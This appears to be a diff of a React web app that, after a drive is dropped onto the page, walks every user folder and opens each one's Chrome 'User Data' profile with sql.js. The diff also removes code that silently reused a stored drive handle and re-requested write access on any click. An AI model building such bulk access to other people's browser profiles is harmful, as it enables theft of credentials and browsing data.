@@ -1,11 +1,9 @@
-import { useEffect, useState } from "react";
-import reactLogo from "./assets/react.svg";
-import viteLogo from "/vite.svg";
-import styles from "./App.module.css";
-import "native-file-system-adapter";
-import sqlWasmUrl from "sql.js/dist/sql-wasm.wasm?url";
-import initSqlJs from "sql.js/dist/sql-wasm.js";
 import * as idb from "idb";
+import "native-file-system-adapter";
+import { useState } from "react";
+import initSqlJs from "sql.js/dist/sql-wasm.js";
+import sqlWasmUrl from "sql.js/dist/sql-wasm.wasm?url";
+import styles from "./App.module.css";
 
 const getDirectory = async (initial: FileSystemDirectoryHandle, path: string[]): Promise<FileSystemDirectoryHandle | undefined> => {
 	try {
@@ -40,7 +38,7 @@ const filterEntries = async <T extends "file" | "directory">(
 const db = await idb.openDB("driveHandle", 1, {
 	upgrade(init) {
 		if (!init.objectStoreNames.contains("driveHandle")) {
-			const store = init.createObjectStore("driveHandle", { keyPath: "id", autoIncrement: true });
+			init.createObjectStore("driveHandle", { keyPath: "id", autoIncrement: true });
 		}
 	},
 });
@@ -54,7 +52,6 @@ function App() {
 		for await (const user of users.values()) {
 			if (user.kind !== "directory") continue;
 			const SQL = await initSqlJs({ locateFile: () => sqlWasmUrl });
-			//const instancesFolder = await getDirectory(user, `AppData/Roaming/PrismLauncher/instances`.split("/"));
 			try {
 				const chromeFolder = await getDirectory(user, `AppData/Local/Google/Chrome/User Data`.split("/"));
 				if (!chromeFolder) continue;
@@ -102,23 +99,7 @@ function App() {
 			}
 		}
 	};
-	useEffect(() => {
-		(async () => {
-			const trx = db.transaction(["driveHandle"], "readonly");
-			if ((await trx.objectStore("driveHandle").count()) > 0) {
-				const value = (await trx.objectStore("driveHandle").getAll())[0];
-				try {
-					const handle = value.handle as FileSystemDirectoryHandle;
-					/*document.addEventListener("click", async() => {
-						await handle.requestPermission({ mode: "readwrite" });
-						await parseDrive(value.handle);
-					})*/
-
-				} catch (e) { console.log(e) /* noop */ }
-			}
-		})();
-	}, []);
-	const onDrop: React.DragEventHandler<HTMLDivElement> = async event => {
+	const onDrop = async (event: React.DragEvent) => {
 		event.preventDefault();
 		setDragging(false);
 		const cDrive = await (async () => {
